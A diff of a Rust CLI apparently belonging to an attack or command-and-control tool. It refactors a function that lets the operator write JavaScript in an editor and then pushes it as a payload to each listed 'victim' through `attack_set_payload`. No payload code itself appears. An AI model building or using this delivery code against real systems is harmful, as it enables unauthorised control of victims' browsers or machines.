@@ -24,10 +24,7 @@ use tokio::fs;
 
 use crate::{errors::*, State};
 
-pub async fn javascript<W: Write>(
-    victims: &Vec<String>,
-    s: &mut State<W>,
-) -> CliResult<Vec<PayloadID>> {
+pub async fn javascript<W: Write>(s: &mut State<W>) -> CliResult<Vec<PayloadID>> {
     const FILE_NAME: &str = "payload.js";
 
     let editor = var("EDITOR").map_err(|_| {
@@ -41,24 +38,26 @@ pub async fn javascript<W: Write>(
 
     let file_path = dir.path().join(FILE_NAME);
 
-    Command::new(&editor)
+    let mut editor_program = Command::new(&editor)
         .arg(&file_path)
-        .output()
+        .spawn()
         .unwrap_or_else(|_| panic!("Unable to launch editor {}", &editor));
+
+    editor_program.wait()?;
 
     let payload_content = fs::read_to_string(&file_path).await?;
 
     let mut payload = PayloadBuilder::default()
         .victim("".into())
         .payload_type("JAVASCRIPT".into())
-        .payload(payload_content)
+        .payload(payload_content.trim().to_owned())
         .password(s.client.get_password().to_owned())
         .build()
         .unwrap();
 
-    let mut payload_ids = Vec::with_capacity(victims.len());
-    for victim in victims.iter() {
-        payload.victim = victim.to_owned();
+    let mut payload_ids = Vec::with_capacity(s.victims.len());
+    for victim in s.victims.iter() {
+        payload.victim = victim.name.to_owned();
         let id = s.client.attack_set_payload(&payload).await?;
         payload_ids.push(id);
     }
